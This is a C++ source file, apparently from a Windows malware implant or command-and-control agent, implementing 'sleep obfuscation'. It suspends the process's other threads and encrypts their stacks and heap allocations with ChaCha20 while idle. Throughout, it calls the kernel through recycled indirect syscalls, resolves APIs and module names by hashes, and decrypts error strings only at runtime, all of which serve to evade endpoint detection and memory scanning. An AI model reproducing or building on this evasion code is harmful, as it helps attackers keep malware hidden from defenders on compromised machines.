#include "StackHeapCrypt.hpp"
#include "Instance.hpp"
#include "Syscalls.hpp"
#include "Win32.hpp"
#include "StringCrypt.hpp"
#include "SecureString.hpp"
#include "SecureException.hpp"
#include "SecureVector.hpp"
#include "Crypt.hpp"

HeapAllocation StackHeapCrypt::HeapAllocations[MAX_HEAP_ALLOCATIONS];
int StackHeapCrypt::HeapAllocationsIndex = 0;

/*
* As far as suspending threads, I tried to only suspend threads performing tasks but this ultimately failed.
* The operating system creates multiple threads that interact with heap allocations made by the main thread.
* Assuming this has to do with optimization and performance with the thread pool and is out of the control of the programmer.
* If I didn't suspend all threads during sleep, they would try to access encrypted allocations and cause a crash.
*/
void StackHeapCrypt::EncryptDecryptStacksAndHeaps(bool encrypt) {
	if (encrypt) {
		Crypt::GenerateChaCha20KeyAndNonce();
        EncryptDecryptHeaps();
        SuspendThreadsAndEncryptStacks();        
	}
	else {
        EncryptDecryptHeaps();
		ResumeThreadsAndDecryptStacks();		
	}
}

void StackHeapCrypt::ChaCha20EncryptDecryptStack(void* stack_top, void* stack_base, const unsigned char* key, const unsigned char* nonce) {
    if (!stack_top || !stack_base || stack_top >= stack_base) {
        return; // Invalid input
    }

    unsigned char* top = (unsigned char*)stack_top;
    unsigned char* base = (unsigned char*)stack_base;
    size_t stack_size = base - top;

    // Encrypt the stack region
    Crypt::ChaCha20EncryptDecryptInPlace(top, stack_size, key, nonce);
}

void StackHeapCrypt::SuspendThreadsAndEncryptStacks() {
    pRtlZeroMemory _pRtlZeroMemory = (pRtlZeroMemory)Win32::NtdllTable.pRtlZeroMemory.pAddress;
    pRtlAllocateHeap _pRtlAllocateHeap = (pRtlAllocateHeap)Win32::NtdllTable.pRtlAllocateHeap.pAddress;
    pRtlFreeHeap _pRtlFreeHeap = (pRtlFreeHeap)Win32::NtdllTable.pRtlFreeHeap.pAddress;

    CLIENT_ID ci;
    OBJECT_ATTRIBUTES oa;
    DWORD dwBufSize = 8192;
    PVOID pBuffer = NULL, ProcessHeap = SystemCalls::Peb->ProcessHeap;
    PSYSTEM_PROCESS_INFORMATION pProcInfo = NULL;
    HANDLE hThread = NULL;

    try {
        _pRtlZeroMemory(&ci, sizeof(ci));
        _pRtlZeroMemory(&oa, sizeof(oa));

        do {
            pBuffer = _pRtlAllocateHeap(ProcessHeap, 0, dwBufSize);
            if (!pBuffer) {
                // Handle allocation failure
                break;
            }

            SyscallPrepare(SystemCalls::SysTable.SysNtQuerySystemInformation.wSyscallNr, SystemCalls::SysTable.SysNtQuerySystemInformation.pRecycled);
            Instance::NtStatus = SysNtQuerySystemInformation(SystemProcessInformation, pBuffer, dwBufSize, &dwBufSize);
            if (!NT_SUCCESS(Instance::NtStatus)) {
                _pRtlFreeHeap(ProcessHeap, 0, pBuffer);
                pBuffer = nullptr;
                if (Instance::NtStatus != STATUS_INFO_LENGTH_MISMATCH) {
                    // If the failure is not due to a mismatched size, handle other errors
                    throw SecureException(Instance::FormatNtStatus(StringCrypt::DecryptString(StringCrypt::GETTINGSYSTEMINFORMATION_CRYPT), Instance::NtStatus));
                }
            }
        } while (Instance::NtStatus == STATUS_INFO_LENGTH_MISMATCH);

        if (!NT_SUCCESS(Instance::NtStatus)) {
            throw SecureException(Instance::FormatNtStatus(StringCrypt::DecryptString(StringCrypt::GETTINGSYSTEMINFORMATION_CRYPT), Instance::NtStatus));
        }

        pProcInfo = (PSYSTEM_PROCESS_INFORMATION)pBuffer;
        do {
            ci.UniqueProcess = pProcInfo->UniqueProcessId;
            if (DWORD(ci.UniqueProcess) == Instance::ProcessId) {
                //std::cout << "Found Process ID: " << DWORD(ci.UniqueProcess) << std::endl;
                PSYSTEM_THREAD_INFORMATION sti = (PSYSTEM_THREAD_INFORMATION)(pProcInfo + 1);
                for (ULONG i = 0; i < pProcInfo->NumberOfThreads; i++) {
                    ci.UniqueThread = sti[i].ClientId.UniqueThread;
                    if (DWORD(sti[i].ClientId.UniqueThread) != Instance::ThreadId) {
                        SyscallPrepare(SystemCalls::SysTable.SysNtOpenThread.wSyscallNr, SystemCalls::SysTable.SysNtOpenThread.pRecycled);
                        Instance::NtStatus = SysNtOpenThread(&hThread, THREAD_ALL_ACCESS, &oa, &ci);
                        if (!NT_SUCCESS(Instance::NtStatus)) {
                            throw SecureException(Instance::FormatNtStatus(StringCrypt::DecryptString(StringCrypt::OPENINGTHREAD_CRYPT), Instance::NtStatus));
                        }
                        SyscallPrepare(SystemCalls::SysTable.SysNtSuspendThread.wSyscallNr, SystemCalls::SysTable.SysNtSuspendThread.pRecycled);
                        Instance::NtStatus = SysNtSuspendThread(hThread, NULL);
                        if (!NT_SUCCESS(Instance::NtStatus)) {
                            throw SecureException(Instance::FormatNtStatus(StringCrypt::DecryptString(StringCrypt::SUSPENDINGTHREAD_CRYPT), Instance::NtStatus));
                        }
                        THREAD_BASIC_INFORMATION tbi;
                        SyscallPrepare(SystemCalls::SysTable.SysNtQueryInformationThread.wSyscallNr, SystemCalls::SysTable.SysNtQueryInformationThread.pRecycled);
                        Instance::NtStatus = SysNtQueryInformationThread(hThread, ThreadBasicInformation, &tbi, sizeof(tbi), NULL);
                        if (!NT_SUCCESS(Instance::NtStatus)) {
                            throw SecureException(Instance::FormatNtStatus(StringCrypt::DecryptString(StringCrypt::QUERYINGTHREADINFORMATION_CRYPT), Instance::NtStatus));
                        }
                        PNT_TIB tib = new NT_TIB;
                        SIZE_T bytesRead = 0;
                        SyscallPrepare(SystemCalls::SysTable.SysNtReadVirtualMemory.wSyscallNr, SystemCalls::SysTable.SysNtReadVirtualMemory.pRecycled);
                        Instance::NtStatus = SysNtReadVirtualMemory(Instance::Process, tbi.TebBaseAddress, tib, sizeof(NT_TIB), &bytesRead);
                        if (!NT_SUCCESS(Instance::NtStatus)) {
                            throw SecureException(Instance::FormatNtStatus(StringCrypt::DecryptString(StringCrypt::READINGMEMORY_CRYPT), Instance::NtStatus));
                        }
                        ChaCha20EncryptDecryptStack(tib->StackLimit, tib->StackBase, Crypt::ChaCha20Key.data(), Crypt::ChaCha20Nonce.data());
                        SyscallPrepare(SystemCalls::SysTable.SysNtClose.wSyscallNr, SystemCalls::SysTable.SysNtClose.pRecycled);
                        Instance::NtStatus = SysNtClose(hThread);
                    }
                }
                break;
            }
            pProcInfo = (PSYSTEM_PROCESS_INFORMATION)((PBYTE)pProcInfo + pProcInfo->NextEntryOffset);
        } while (true);
    }
    catch (const SecureException& e) {
        if (pBuffer) {
            _pRtlFreeHeap(ProcessHeap, 0, pBuffer);
            pBuffer = nullptr;
        }
        if (hThread) {
            SyscallPrepare(SystemCalls::SysTable.SysNtClose.wSyscallNr, SystemCalls::SysTable.SysNtClose.pRecycled);
            Instance::NtStatus = SysNtClose(hThread);
        }
        throw;
    }
    catch (...) {
        if (pBuffer) {
            _pRtlFreeHeap(ProcessHeap, 0, pBuffer);
            pBuffer = nullptr;
        }
        if (hThread) {
            SyscallPrepare(SystemCalls::SysTable.SysNtClose.wSyscallNr, SystemCalls::SysTable.SysNtClose.pRecycled);
            Instance::NtStatus = SysNtClose(hThread);
        }
        throw;
    }
}

void StackHeapCrypt::ResumeThreadsAndDecryptStacks() {
    pRtlZeroMemory _pRtlZeroMemory = (pRtlZeroMemory)Win32::NtdllTable.pRtlZeroMemory.pAddress;
    pRtlAllocateHeap _pRtlAllocateHeap = (pRtlAllocateHeap)Win32::NtdllTable.pRtlAllocateHeap.pAddress;
    pRtlFreeHeap _pRtlFreeHeap = (pRtlFreeHeap)Win32::NtdllTable.pRtlFreeHeap.pAddress;

    CLIENT_ID ci;
    OBJECT_ATTRIBUTES oa;
    DWORD dwBufSize = 8192;
    PVOID pBuffer = NULL, ProcessHeap = SystemCalls::Peb->ProcessHeap;
    PSYSTEM_PROCESS_INFORMATION pProcInfo = NULL;
    HANDLE hThread = NULL;

    try {
        _pRtlZeroMemory(&ci, sizeof(ci));
        _pRtlZeroMemory(&oa, sizeof(oa));

        do {
            pBuffer = _pRtlAllocateHeap(ProcessHeap, 0, dwBufSize);
            if (!pBuffer) {
                // Handle allocation failure
                break;
            }

            SyscallPrepare(SystemCalls::SysTable.SysNtQuerySystemInformation.wSyscallNr, SystemCalls::SysTable.SysNtQuerySystemInformation.pRecycled);
            Instance::NtStatus = SysNtQuerySystemInformation(SystemProcessInformation, pBuffer, dwBufSize, &dwBufSize);
            if (!NT_SUCCESS(Instance::NtStatus)) {
                _pRtlFreeHeap(ProcessHeap, 0, pBuffer);
                pBuffer = nullptr;
                if (Instance::NtStatus != STATUS_INFO_LENGTH_MISMATCH) {
                    // If the failure is not due to a mismatched size, handle other errors
                    throw SecureException(Instance::FormatNtStatus(StringCrypt::DecryptString(StringCrypt::GETTINGSYSTEMINFORMATION_CRYPT), Instance::NtStatus));
                }
            }
        } while (Instance::NtStatus == STATUS_INFO_LENGTH_MISMATCH);

        if (!NT_SUCCESS(Instance::NtStatus)) {
            throw SecureException(Instance::FormatNtStatus(StringCrypt::DecryptString(StringCrypt::GETTINGSYSTEMINFORMATION_CRYPT), Instance::NtStatus));
        }

        pProcInfo = (PSYSTEM_PROCESS_INFORMATION)pBuffer;
        do {
            ci.UniqueProcess = pProcInfo->UniqueProcessId;
            if (DWORD(ci.UniqueProcess) == Instance::ProcessId) {
                PSYSTEM_THREAD_INFORMATION sti = (PSYSTEM_THREAD_INFORMATION)(pProcInfo + 1);
                for (ULONG i = 0; i < pProcInfo->NumberOfThreads; i++) {
                    ci.UniqueThread = sti[i].ClientId.UniqueThread;
                    if (DWORD(sti[i].ClientId.UniqueThread) != Instance::ThreadId) {
                        SyscallPrepare(SystemCalls::SysTable.SysNtOpenThread.wSyscallNr, SystemCalls::SysTable.SysNtOpenThread.pRecycled);
                        Instance::NtStatus = SysNtOpenThread(&hThread, THREAD_ALL_ACCESS, &oa, &ci);
                        if (!NT_SUCCESS(Instance::NtStatus)) {
                            throw SecureException(Instance::FormatNtStatus(StringCrypt::DecryptString(StringCrypt::OPENINGTHREAD_CRYPT), Instance::NtStatus));
                        }
                        THREAD_BASIC_INFORMATION tbi;
                        SyscallPrepare(SystemCalls::SysTable.SysNtQueryInformationThread.wSyscallNr, SystemCalls::SysTable.SysNtQueryInformationThread.pRecycled);
                        Instance::NtStatus = SysNtQueryInformationThread(hThread, ThreadBasicInformation, &tbi, sizeof(tbi), NULL);
                        if (!NT_SUCCESS(Instance::NtStatus)) {
                            throw SecureException(Instance::FormatNtStatus(StringCrypt::DecryptString(StringCrypt::QUERYINGTHREADINFORMATION_CRYPT), Instance::NtStatus));
                        }
                        PNT_TIB tib = new NT_TIB;
                        SIZE_T bytesRead = 0;
                        SyscallPrepare(SystemCalls::SysTable.SysNtReadVirtualMemory.wSyscallNr, SystemCalls::SysTable.SysNtReadVirtualMemory.pRecycled);
                        Instance::NtStatus = SysNtReadVirtualMemory(Instance::Process, tbi.TebBaseAddress, tib, sizeof(NT_TIB), &bytesRead);
                        if (!NT_SUCCESS(Instance::NtStatus)) {
                            throw SecureException(Instance::FormatNtStatus(StringCrypt::DecryptString(StringCrypt::READINGMEMORY_CRYPT), Instance::NtStatus));
                        }
                        ChaCha20EncryptDecryptStack(tib->StackLimit, tib->StackBase, Crypt::ChaCha20Key.data(), Crypt::ChaCha20Nonce.data());
                        SyscallPrepare(SystemCalls::SysTable.SysNtResumeThread.wSyscallNr, SystemCalls::SysTable.SysNtResumeThread.pRecycled);
                        Instance::NtStatus = SysNtResumeThread(hThread, NULL);
                        if (!NT_SUCCESS(Instance::NtStatus)) {
                            throw SecureException(Instance::FormatNtStatus(StringCrypt::DecryptString(StringCrypt::RESUMINGTHREAD_CRYPT), Instance::NtStatus));
                        }
                        SyscallPrepare(SystemCalls::SysTable.SysNtClose.wSyscallNr, SystemCalls::SysTable.SysNtClose.pRecycled);
                        Instance::NtStatus = SysNtClose(hThread);
                    }
                }
                break;
            }
            pProcInfo = (PSYSTEM_PROCESS_INFORMATION)((PBYTE)pProcInfo + pProcInfo->NextEntryOffset);
        } while (true);
    }
    catch (const SecureException& e) {
        if (pBuffer) {
            _pRtlFreeHeap(ProcessHeap, 0, pBuffer);
            pBuffer = nullptr;
        }
        if (hThread) {
            SyscallPrepare(SystemCalls::SysTable.SysNtClose.wSyscallNr, SystemCalls::SysTable.SysNtClose.pRecycled);
            Instance::NtStatus = SysNtClose(hThread);
        }
        throw;
    }
    catch (...) {
        if (pBuffer) {
            _pRtlFreeHeap(ProcessHeap, 0, pBuffer);
            pBuffer = nullptr;
        }
        if (hThread) {
            SyscallPrepare(SystemCalls::SysTable.SysNtClose.wSyscallNr, SystemCalls::SysTable.SysNtClose.pRecycled);
            Instance::NtStatus = SysNtClose(hThread);
        }
        throw;
    }
}

void StackHeapCrypt::EncryptDecryptHeaps() {
    pRtlZeroMemory _pRtlZeroMemory = (pRtlZeroMemory)Win32::NtdllTable.pRtlZeroMemory.pAddress;
    pRtlWalkHeap _pRtlWalkHeap = (pRtlWalkHeap)Win32::NtdllTable.pRtlWalkHeap.pAddress;

    RTL_HEAP_WALK_ENTRY phe;
    for (ULONG i = 0; i < SystemCalls::Peb->NumberOfHeaps; i++) {
        HANDLE hHeap = SystemCalls::Peb->ProcessHeaps[i];
        if (hHeap) {
            if (hHeap == SystemCalls::Peb->ProcessHeap) {
                _pRtlZeroMemory(&phe, sizeof(phe));
                while (NT_SUCCESS(_pRtlWalkHeap(hHeap, &phe))) {
                    // If we try to encrypt busy entries, we will cause a crash
                    if ((phe.Flags & RTL_HEAP_BUSY) != 0) {
                        for (int i = 0; i < HeapAllocationsIndex; i++) {
                            HeapAllocation heapAllocation = HeapAllocations[i];
                            if (ShouldEncryptAllocation(&heapAllocation, &phe)) {
                                //printf("Blacklisted module found in heap! BaseAddress: %p Size: %d phe.DataAddress: %p phe.DataSize: %d\n", heapAllocation.BaseAddress, heapAllocation.Size, phe.DataAddress, phe.DataSize);
                                Crypt::ChaCha20EncryptDecryptInPlace((BYTE*)phe.DataAddress, phe.DataSize, Crypt::ChaCha20Key.data(), Crypt::ChaCha20Nonce.data());
                            }
                        }
                    }
                }
            }
            else {
                _pRtlZeroMemory(&phe, sizeof(phe));
                while (NT_SUCCESS(_pRtlWalkHeap(hHeap, &phe))) {
                    if ((phe.Flags & RTL_HEAP_BUSY) != 0) {
                        //printf("Encrypting...\n");
                        Crypt::ChaCha20EncryptDecryptInPlace((BYTE*)phe.DataAddress, phe.DataSize, Crypt::ChaCha20Key.data(), Crypt::ChaCha20Nonce.data());
                    }
                }
            }            
        }
    }
}

bool StackHeapCrypt::ShouldEncryptAllocation(HeapAllocation* allocation, PRTL_HEAP_WALK_ENTRY entry) {
    pGetModuleHandleExA _pGetModuleHandleExA = (pGetModuleHandleExA)Win32::Kernel32Table.pGetModuleHandleExA.pAddress;
    pGetModuleBaseNameA _pGetModuleBaseNameA = (pGetModuleBaseNameA)Win32::Kernel32Table.pGetModuleBaseNameA.pAddress;

    if (allocation->BaseAddress != nullptr && allocation->ReturnAddress != nullptr) {
        BYTE* heapAllocationBase = static_cast<BYTE*>(allocation->BaseAddress);
        BYTE* entryAddress = static_cast<BYTE*>(entry->DataAddress);
        BYTE* entryEnd = static_cast<BYTE*>(entry->DataAddress) + entry->DataSize;

        if (heapAllocationBase >= entryAddress && heapAllocationBase <= entryEnd) {

            //printf("Found in heap: %p\n", heapAllocationBase);
            HMODULE hModule;
            char lpBaseName[256];

            // Get the module handle from the return address
            if (_pGetModuleHandleExA(GET_MODULE_HANDLE_EX_FLAG_FROM_ADDRESS, (LPCSTR)allocation->ReturnAddress, &hModule) == 1) {
                /*if (hModule == GetModuleHandleA(NULL)) {
					return false;
				}*/

                // Get the base name of the module
                _pGetModuleBaseNameA(Instance::Process, hModule, lpBaseName, sizeof(lpBaseName));
                   
                /*
                * advapi32.dll - no allocations
                * amsi.dll - no allocations
                * bcrypt.dll - not good
                * bcryptprimitives.dll - good
                * combase.dll - no allocations
                * crypt32.dll - no allocations
                * cryptbase.dll - no allocations
                * cryptsp.dll - no allocations
                * dnsapi.dll - good
                * dpapi.dll - no allocations
                * gdi32.dll - no allocations
                * gdi32full.dll - no allocations
                * gpapi.dll - no allocations
                * imm32.dll - no allocations
                * kernel32.dll - good
                * kernelbase.dll - good
                * msasn1.dll - no allocations
                * mscoree.dll - no allocations
                * msvcp140.dll - no allocations
                * msvcp_win.dll - no allocations
                * msvcrt.dll - no allocations
                * mswsock.dll - good
                * ncrypt.dll - good
                * ncryptsslp.dll - good
                * nsi.dll - no allocations
                * ntasn1.dll - no allocations
                * ntdll.dll - not good
                * oleaut32.dll - no allocations
                * rasadhlp.dll - no allocations
                * rpcrt4.dll - good
                * rsaenh.dll - good
                * schannel.dll - no allocations
                * sechost.dll - no allocations
                * shell32.dll - no allocations
                * sspicli.dll - no allocations
                * ucrtbase.dll - good
                * user32.dll - no allocations
                * vcruntime140.dll - no allocations
                * vcruntime140_1.dll - no allocations
                * webio.dll - good
                * win32u.dll - no allocations
                * winhttp.dll - good
                * winnlsres.dll - no allocations
                * winnsi.dll - good
                * ws2_32.dll - good
                */
                /*printf("Strings for module: %s ", lpBaseName);
                FindMemoryStrings((PUCHAR)heapAllocationBase, allocation->Size);*/

                /*if (SystemCalls::djb2(reinterpret_cast<unsigned char*>(lpBaseName)) == SystemCalls::xor_hash(WS2_32DLL_HASH)) {
                    return true;
                }*/

                if (SystemCalls::djb2(reinterpret_cast<unsigned char*>(lpBaseName)) == SystemCalls::xor_hash(NTDLLDLL_HASH)
                    || SystemCalls::djb2(reinterpret_cast<unsigned char*>(lpBaseName)) == SystemCalls::xor_hash(BCRYPTDLL_HASH)
                    || SystemCalls::djb2(reinterpret_cast<unsigned char*>(lpBaseName)) == SystemCalls::xor_hash(CRYPTSPDLL_HASH)) {
                    //printf("Found in module: %s\n", lpBaseName);
					return false;
				}

                //printf("Found in module: %s\n", lpBaseName);
                return true;
            }
        }
    }    

    return false;
}
